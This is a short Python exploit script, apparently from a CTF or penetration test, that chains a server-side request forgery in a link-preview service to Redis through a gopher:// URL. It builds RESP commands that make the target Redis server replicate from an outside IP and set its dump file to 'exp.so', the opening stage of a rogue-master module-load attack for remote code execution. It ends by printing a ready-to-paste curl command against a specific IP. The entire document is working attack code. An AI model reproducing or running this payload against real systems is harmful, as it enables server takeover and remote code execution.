import base64
import urllib.parse

def redis_cmd(*args):
    """Build Redis RESP protocol for a command"""
    parts = list(args)
    payload = f"*{len(parts)}\r\n"
    for p in parts:
        payload += f"${len(p)}\r\n{p}\r\n"
    return payload

# === STAGE 1: SLAVEOF + set dbfilename ===
gopher_payload = ""
gopher_payload += redis_cmd("SLAVEOF", "119.28.116.166", "6388")
gopher_payload += redis_cmd("CONFIG", "SET", "dbfilename", "exp.so")
gopher_payload += redis_cmd("QUIT")

# URL-encode the gopher payload for the path
encoded_payload = urllib.parse.quote(gopher_payload, safe='')
gopher_url = f"gopher://redis:6379/_{encoded_payload}"

# Base64url encode for shortlink
short = base64.urlsafe_b64encode(gopher_url.encode()).decode().rstrip("=")
preview_url = f"http://23.239.30.114:8081/api/preview?url=http://localhost:5000/l/{short}"

print(f"Shortlink token: {short}")
print(f"\nCurl command (copy-paste this):")
print(f"curl -s '{preview_url}'")
